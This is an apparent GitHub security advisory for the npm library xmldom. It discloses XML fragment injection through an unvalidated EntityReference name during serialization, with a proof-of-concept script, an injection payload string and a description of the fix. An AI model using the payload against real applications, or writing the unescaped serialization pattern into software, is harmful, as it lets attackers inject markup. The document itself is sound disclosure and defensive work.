# [M] xmldom: XML fragment injection via invalid EntityReference.nodeName during requireWellFormed serialization

## Summary
Severity: Medium
Advisory: GHSA-6gmq-8vp8-gcm6
CVE: CVE-2026-83610
CWE: CWE-116
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-09-02
Source: https://github.com/advisories/GHSA-6gmq-8vp8-gcm6
Type: github-advisory

## Affected
- npm: `@xmldom/xmldom` — affected >=0.7.0 <0.8.15
- npm: `@xmldom/xmldom` — affected >=0.9.0 <0.9.12
- npm: `xmldom` — affected >=0

## Details
## Summary

An `EntityReference` node can be created with an invalid, attacker-controlled name through `Document.createEntityReference(name)`. When this node is serialized directly with:

```js
serializer.serializeToString(ref, { requireWellFormed: true })
```

the invalid `nodeName` is emitted into the serialized XML fragment without validation or escaping.

This can produce real XML markup in the serialized output. In the proof of concept below, the serialized fragment contains `<injected/>`, and reparsing the fragment creates a real `injected` element.

---

## Details

The issue appears to be in the serialization path for `ENTITY_REFERENCE_NODE`.

For several other node types, `requireWellFormed: true` performs specific validation checks before serialization. For example, comments, processing instructions, document types, and some character data cases are checked before being emitted.

However, for `ENTITY_REFERENCE_NODE`, the serializer appears to emit the node name directly in entity reference form:

```js
case ENTITY_REFERENCE_NODE:
  buf.push('&', n.nodeName, ';');
  return null;
```

As a result, if `nodeName` contains characters that break out of the intended `&name;` structure, the serializer can emit additional XML markup.

For example, an entity reference created with the name:

```text
safe; <injected/> &x
```

is serialized as:

```xml
&safe; <injected/> &x;
```

When this fragment is later parsed in an XML context, `<injected/>` becomes a real element.

This is especially surprising when `{ requireWellFormed: true }` is used, because applications may reasonably treat this mode as the stricter or safer XML serialization mode.

---

## Proof of Concept

Tested with:

```text
@xmldom/xmldom@0.9.10
Node.js v24.18.0
Windows 10 / PowerShell
```

```js
'use strict';

const { DOMImplementation, XMLSerializer, DOMParser } = require('@xmldom/xmldom');

const impl = new DOMImplementation();
const doc = impl.createDocument(null, 'root', null);
const serializer = new XMLSerializer();

function countInjected(fragment) {
  try {
    const parsed = new DOMParser().parseFromString(`<root>${fragment}</root>`, 'application/xml');
    return parsed.getElementsByTagName('injected').length;
  } catch (e) {
    return `PARSE_THROW ${e.name}: ${e.message}`;
  }
}

for (const name of [
  'safe',
  'safe; <injected/> &x',
  'x<injected',
  'x y'
]) {
  try {
    const ref = doc.createEntityReference(name);
    const xml = serializer.serializeToString(ref, { requireWellFormed: true });

    console.log(`[SERIALIZED] ${JSON.stringify(name)}: ${xml}`);
    console.log(`[INJECTED_COUNT] ${JSON.stringify(name)}: ${countInjected(xml)}`);
  } catch (e) {
    console.log(`[THROW] ${JSON.stringify(name)}: ${e.name}: ${e.message}`);
  }
}
```

Observed output:

```text
[SERIALIZED] "safe": &safe;
[INJECTED_COUNT] "safe": 0

[SERIALIZED] "safe; <injected/> &x": &safe; <injected/> &x;
[INJECTED_COUNT] "safe; <injected/> &x": 1

[SERIALIZED] "x<injected": &x<injected;
[INJECTED_COUNT] "x<injected": 0

[SERIALIZED] "x y": &x y;
[INJECTED_COUNT] "x y": 0
```

---

## Impact

An application that creates an `EntityReference` from attacker-controlled input and then serializes that node or XML fragment with `requireWellFormed: true` may produce XML containing attacker-controlled markup.

The impact is limited by two observations:

1. The parser does not create `EntityReference` nodes from ordinary XML entity references.
2. Appending an `EntityReference` node as an element child is rejected with a `HierarchyRequestError`.

The main affected scenario is applications that directly use `createEntityReference(name)` and then serialize the resulting node or fragment.

## Fix Applied

Two complementary, non-breaking fixes.
(1) `document.createEntityReference(name)` rejects an invalid `Name` at creation, closing the reachable creation vector by default — the opt-in serializer check alone cannot, since a later `nodeName` mutation would bypass a creation-only guard.
(2) Under `requireWellFormed`, the serializer validates the `EntityReference` `nodeName` as a well-formed XML `Name` and throws `InvalidStateError` when it is not; a valid reference still serializes as `&name;`. Both ship on both maintained versions. The `EntityReference` / `createEntityReference` docs note that under `requireWellFormed` the `nodeName` is validated as an XML `Name`, and that xmldom does not expand entities. See the [XML `Name` production](https://www.w3.org/TR/xml/#NT-Name).
> **⚠ Opt-in required.** Protection is not automatic. Existing serialization calls remain
> vulnerable unless `{ requireWellFormed: true }` is explicitly passed. Applications that
> serialize untrusted DOM content should audit all `serializeToString()` call sites and add it.

### Proof of Concept - fixed path

```js
'use strict';

const { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');

const impl = new DOMImplementation();
const doc = impl.createDocument(null, 'root', null);
const serializer = new XMLSerializer();

// Creation-time anchor (applied by default): an invalid XML Name is rejected at creation.
try {
  doc.createEntityReference('safe; <injected/> &x');
} catch (e) {
  console.log(`${e.name}`); // rejected at creation
}

// Default path (requireWellFormed omitted): because creation now rejects an ill-formed name,
// an ill-formed nodeName is only reachable via a post-creation mutation — and is emitted verbatim.
const ref = doc.createEntityReference('safe');
ref.nodeName = 'safe; <injected/> &x';
console.log(serializer.serializeToString(ref));
// -> &safe; <injected/> &x;   (injection present on the default path)

// Opt-in path: throws on the invalid nodeName.
try {
  serializer.serializeToString(ref, { requireWellFormed: true });
} catch (e) {
  console.log(`${e.name}`); // InvalidStateError
}

// A valid name still serializes as &name; under requireWellFormed.
const ok = doc.createEntityReference('valid');
console.log(serializer.serializeToString(ok, { requireWellFormed: true }));
// -> &valid;
```

### Why the default stays verbatim

The creation-time anchor is applied by default, because it is classified non-breaking. The serializer check, by contrast, stays gated behind `{ requireWellFormed: true }`: W3C DOM Parsing's require-well-formed flag defaults to `false`, and the browser `XMLSerializer` emits the `nodeName` verbatim in that default mode, so unconditionally throwing for an ill-formed `EntityReference.nodeName` would be an unjustified breaking change — which is why the default serialization path stays verbatim.

### Residual limitation

The creation vector is closed by default — the non-breaking creation-time anchor — with no further deferred work. The residual is at serialization: the default path still emits an ill-formed `nodeName` verbatim, because the serializer check is opt-in via `{ requireWellFormed: true }`.

## References
- https://github.com/xmldom/xmldom/security/advisories/GHSA-6gmq-8vp8-gcm6
- https://nvd.nist.gov/vuln/detail/CVE-2026-83610
- https://github.com/xmldom/xmldom/pull/1071
- https://github.com/xmldom/xmldom/pull/1072
- https://github.com/xmldom/xmldom/commit/4664386e4f4d99d17b416a151dbe8323e245284b
- https://github.com/xmldom/xmldom/commit/6c3fb5ffeafe7901ec928ce9010988dd716c94a0
- https://github.com/xmldom/xmldom
- https://github.com/xmldom/xmldom/releases/tag/0.8.15
- https://github.com/xmldom/xmldom/releases/tag/0.9.12
